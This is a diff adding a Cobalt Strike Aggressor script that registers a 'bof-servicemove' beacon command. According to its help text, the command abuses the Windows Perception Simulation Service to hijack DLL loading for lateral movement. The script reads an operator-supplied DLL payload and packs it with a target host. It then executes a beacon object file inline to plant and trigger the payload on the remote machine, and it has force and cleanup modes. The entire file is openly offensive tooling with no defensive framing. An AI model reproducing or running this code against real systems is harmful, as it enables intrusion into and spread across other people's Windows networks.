@@ -1,0 +1,45 @@
+beacon_command_register("bof-servicemove", "New lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking.", 
+"===General use===
+Command: bof-servicemove target /root/hid.dll
+
+===Force mode===
+Description: restart the service if the service is already running
+Command: bof-servicemove target /root/hid.dll force
+
+===Cleanup mode===
+Description: stop the service if running and delete the DLL payload file
+Command: bof-servicemove target cleanup");
+
+alias bof-servicemove {
+	local('$args');
+	$barch  = barch($1);
+	if(size(@_) < 3){
+		berror($1, "Missing arugment. Example: bof-servicemove target /root/hid.dll");
+		return;
+	}
+	$targetHost = $2;
+	$DLL = $3;
+	if($DLL eq "cleanup"){
+		$args = bof_pack($1, "zz", $targetHost, $DLL);
+		$handle = openf(script_resource("servicemove. $+ $barch $+ .o"));
+		$data = readb($handle, -1);
+		closef($handle);
+		beacon_inline_execute($1, $data, "go", $args);
+	}else{
+		$option = $4;
+		$DLLFileName = split("\\\\", $DLL)[-1];
+		$DLLFileName = split("/", $DLLFileName)[-1];
+		$DLLhandle = openf($DLL);
+		$DLLdata = readb($DLLhandle, -1);
+		closef($DLLhandle);
+		if(strlen($DLLdata) == 0){
+			berror($1, "File is empty or not exit. Please use a valid file.");
+			return;
+		}
+		$args = bof_pack($1, "zzb", $targetHost, $option, $DLLdata);
+		$handle = openf(script_resource("servicemove. $+ $barch $+ .o"));
+		$data = readb($handle, -1);
+		closef($handle);
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
